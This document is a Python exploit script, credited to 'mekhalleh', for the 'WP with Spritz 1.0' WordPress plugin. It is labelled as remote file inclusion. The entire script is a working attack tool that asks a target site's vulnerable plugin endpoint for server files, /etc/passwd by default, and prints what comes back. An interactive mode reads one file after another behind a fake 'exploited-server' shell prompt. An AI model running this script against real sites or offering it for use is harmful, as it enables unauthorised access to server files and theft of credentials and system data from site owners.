#!/usr/bin/env python

from sys import argv, exit

PROMPT             = "exploited-server@www-data$"
WP_PLUGIN_PATH     = "/wp-content/plugins/"
WP_PLUGIN_TARGETED = "wp-with-spritz/wp.spritz.content.filter.php?url="

def cli_args() :
	import argparse
	parser   = argparse.ArgumentParser(
		add_help    = False,
		description = "WP with Spritz 1.0 (WordPress Plugin) - RFI"
	)

	optional = parser._action_groups.pop()
	required = parser.add_argument_group("required arguments")

	required.add_argument(
		"--url", "-u", action = "store",
		help = "Target URL to exploit [ ex: http://www.targeted.com/ ]"
	)

	optional.add_argument(
		"--path", "-p", action = "store",
		help = "Path of Wordpress directory [ default: / ]."
	)

	optional.add_argument(
		"--interactive", "-i", action = "store_true",
		help = "Initiate a interactive session."
	)

	optional.add_argument(
		"remote_file", nargs = '?', default="/etc/passwd",
		help = "File to read on the target machine."
	)

	optional.add_argument(
		"--help", "-h", action = "store_true",
		help = argparse.SUPPRESS
	)

	parser._action_groups.append(optional)
	return(cli_args_helper(parser.parse_args(), parser))

def cli_args_helper(arguments, parser) :
	
	## URL.
	if(arguments.url) :
		if(isurl(arguments.url)) :
			arguments.url = arguments.url.rstrip('/')
		else :
			exiting("The URL target < " + arguments.url + " > isn't valid!", 1)
	
	## Path.
	if(not(arguments.path)) :
		arguments.path = '/'
	else :
		arguments.path = arguments.path.rstrip('/')

	# Help message and exit.
	if((arguments.help) or (len(argv) <= 1)) :
		parser.print_help()
		exit(0)

	return(arguments)

def entry_point() :
	# Header
	print("WP with Spritz 1.0 (WordPress Plugin) - RFI\n\tby mekhalleh [www.pirates.re]\n")

	params   = cli_args()

	if(not(params.interactive)) :	
		response = send_exploit_request(params.url + params.path, params.remote_file)
		if(response) :
			print("%s cat %s\n%s" % (PROMPT, params.remote_file, response))
		else :
			print("The file < %s > doesn't exist." % (params.remote_file))
	else :
		try :
			while(True) :
				remote_file = raw_input("File to read: ")
				if((remote_file.lower() == "exit") or (remote_file.lower() == "quit")) :
					exiting("Stopped on 'user' invokation.", 0)

				if(remote_file != "") :

					response    = send_exploit_request(params.url + params.path, remote_file)
					if(response) :
						print("%s cat %s\n%s" % (PROMPT, params.remote_file, response))
					else :
						print("The file < %s > doesn't exist." % (params.remote_file))
				else :
					print("The file is empty! please, select a file.")

				response    = ""

		except KeyboardInterrupt :
			exiting("Stopped on 'Ctrl-C' invokation.", 0)
	exit(0)

def exiting(message, ret_code) :
	print("[!!] %s\nExiting..." % (message))
	exit(ret_code)

def isurl(url) :
	from re import compile, match, IGNORECASE
	r = compile(
    	r"^(?:http)s?://"                                                                     # http:// or https://
		r"(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|"  # domain name
		r"localhost|"                                                                         # localhost
		r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|"                                                # IPv4
		r"\[?[A-F0-9]*:[A-F0-9:]+\]?)"                                                        # IPv6
		r"(?::\d+)?"                                                                          # optional port
		r"(?:/?|[/?]\S+)$",
		IGNORECASE
	)

	if(match(r, url)) :
		return(True)

	return(False)

def send_exploit_request(url, file_name) :
	from urllib2 import urlopen

	PAYLOAD  = url + WP_PLUGIN_PATH + WP_PLUGIN_TARGETED + file_name
	page     = urlopen(PAYLOAD)
	src      = page.read()
	page.close()

	if(src) :
		return(src)
	else :
		return(False)

if(__name__ == "__main__") :
	entry_point()
	exit(0)
